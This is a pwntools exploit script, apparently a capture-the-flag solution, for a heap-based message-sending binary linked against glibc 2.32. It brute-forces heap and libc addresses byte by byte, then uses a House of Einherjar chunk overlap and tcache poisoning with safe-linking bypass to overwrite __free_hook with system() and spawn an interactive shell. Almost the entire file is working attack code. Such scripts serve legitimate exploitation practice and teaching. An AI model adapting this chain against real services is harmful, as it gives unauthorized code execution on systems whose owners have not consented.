#!/usr/bin/env python3

import subprocess
from pwn import *

exe = ELF("bin/textsender", checksec=False)
libc = ELF("bin/libc-2.32.so", checksec=False)
ld = ELF("bin/ld-2.32.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 9992)
    return r

def set_sender(sender):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'name: ', sender)


def add(receiver, message):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Receiver: ', receiver)
    p.sendlineafter(b'Message: ', message)

def edit(receiver, message):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Name: ', receiver)
    p.sendlineafter(b'message: ', message)

def print_message():
    p.sendlineafter(b'> ', b'4')

def send_message():
    p.sendlineafter(b'> ', b'5')

def GDB():
    context.log_level = 'debug'
    command = '''
    b*main+82
    b*set_sender+9
    b*add_message+54
    b*edit_message+75
    b*send_message+79
    b*send_message+103
    b*send_message+172
    c
    '''
    with open('/tmp/command.gdb', 'wt') as f:
        f.write(command)
    subprocess.Popen(['/usr/bin/x-terminal-emulator', '--geometry', '960x1080+0+0', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
    input()         # input() to make program wait with gdb

context.log_level = 'debug'
p = conn()

##########################
### Stage 1: Leak heap ###
##########################
log.info("Leaking heap...")
for i in range(8):
    add(f'{str(i)*8}'.encode(), f'{str(i)*8}'.encode())
send_message()
for i in range(8):
    add(f'{str(i)*8}'.encode(), f'{str(i)*8}'.encode())
set_sender(b'AAAAAAAA')
send_message()
for i in range(6):
    add(f'{str(i)*8}'.encode(), f'{str(i)*8}'.encode())
heap_leak = []
for i in range(0x10):
    for j in range(0x100):
        if (0x8 <= j) and (j <= 0xd):
            continue
        p.sendlineafter(b'> ', b'3')
        payload = flat(
            b'5'*0x8,          # Receiver
            b'\x00'*0x70,      # Receiver
            0x201,
            b''.join([p8(k) for k in heap_leak]),
            p8(j)
            )
        p.sendlineafter(b'Name: ', payload)
        # p.interactive()
        if b'message' in p.recvline():
            # GDB()
            log.info("Leak byte: " + hex(j)[2:])
            heap_leak.append(j)
            p.sendlineafter(b'message: ', b'5'*0x8)
            break
heap = u64(b''.join([p8(i) for i in heap_leak[8:]])) - 0x10
log.info("Heap base: " + hex(heap))

##########################
### Stage 2: Leak libc ###
##########################
log.info("Leaking libc...")
libc_leak = []
for i in range(0x8):
    for j in range(0x100):
        # GDB()
        if (0x8 <= j) and (j <= 0xd):
            continue
        p.sendlineafter(b'> ', b'3')
        payload = flat(
            b'5'*0x8,          # Receiver
            b'\x00'*0x70,      # Receiver
            0x201,
            b''.join([p8(k) for k in heap_leak]),
            b'\x00'*0x1e8, 0x21,
            b''.join([p8(k) for k in libc_leak]),
            p8(j)
            )
        p.sendlineafter(b'Name: ', payload)
        # p.interactive()
        if b'message' in p.recvline():
            # log.info("Leak byte: " + hex(j)[2:])
            libc_leak.append(j)
            p.sendlineafter(b'message: ', b'5'*0x8)
            break
main_arena = u64(b''.join([p8(i) for i in libc_leak]))
log.info("Main arena: " + hex(main_arena))
libc.address = main_arena - 0x1c5c10
log.info("Libc base: " + hex(libc.address))
log.info("Heap base: " + hex(heap))

###################################
### Stage 3: House of Einherjar ###
###################################
log.info("Conducting House of Einherjar...")
edit(b'5'*0x8, b'5'*8 + b'\x00'*8 + flat(0, 0x2850, heap + 0x10d0, heap + 0x10d0))
for i in range(6, 7):
    add(f'{str(i)*8}'.encode(), f'{str(i)*8}'.encode() + b'.' + f'{str(i)*8}'.encode())

add(b'7'*8 + b'\x00'*0x68 + p64(0x2850), b'77777777.77777777')
set_sender(b'AAAAAAAA')
send_message()

payload = b'\x00'*0x1d8 + p64(0x21)
payload += p64(((heap + 0x12c0) >> 12) ^ (heap + 0x1020)) + p64(heap + 0x10)
payload += b'\x00'*0x8 + p64(0x81) + p64(((heap+0x12e0) >> 12) ^ libc.sym['__free_hook']) + p64(heap+0x10)
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Name: ', payload)

# GDB()

add(b'0'*8, b'/bin/sh\x00')
add(p64(libc.sym['system']), b'/bin/sh\x00')
# send_message()
p.sendlineafter(b'> ', b'5')
p.interactive()
